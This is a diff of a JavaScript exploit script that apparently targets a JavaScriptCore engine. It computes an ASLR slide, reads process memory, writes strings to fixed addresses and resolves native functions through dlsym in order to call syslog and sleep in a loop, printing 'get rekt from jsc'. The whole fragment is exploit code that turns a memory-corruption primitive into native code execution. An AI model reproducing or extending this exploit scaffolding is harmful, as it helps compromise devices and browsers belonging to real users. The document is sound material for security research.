@@ -24,7 +24,7 @@ function main() {
 	slide = get_our_slide();
 	base = 0x4000 + (slide << 12);
 	slid = (slide << 12);
-	//	call(0x41424344);
+//	call(0x41424344);
 
 	log("slide=0x" + slide.toString(16));
 	log("*(uint8_t*)base = 0x" + read_u8(base).toString(16));
@@ -49,17 +49,19 @@ function main() {
 
 	var dlsym_addy = read_u32(0x1a0000 + 24 + slid);
 	var shc_slide = read_u32(0x1a0000 + 20 + slid);
-	write_str(0x148000, "get rekt from jsc\0");
+	write_str(0x148000, "get rekt from jsc %d\0");
 	write_str(0x149000, "syslog\0");
 	write_str(0x14a000, "sleep\0");
-	while (true) {
-		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, 0x2, 0x3);
+//	while (true) {
+//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, 0x2, 0x3);
+//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 10, 0x1, 0x2, 0x3);
+//	}
+
+	for (var i = 0; i < 0x1000; i++) {
+		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x28, 0x148000, i, 0x3);
 		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x14a000, 0, 0), 10, 0x1, 0x2, 0x3);
+//		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x148000, i, 0x2, 0x3);
 	}
-/*
-	for (i = 0; i < 0x1000; i++) {
-		call4arg(call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x149000, 0, 0), 0x148000, i, 0x2, 0x3);
-	}*/
 
 //	call(0x9ac54 + (slide << 12));
 //	write_u32(0x1013b8, 0x41414141);
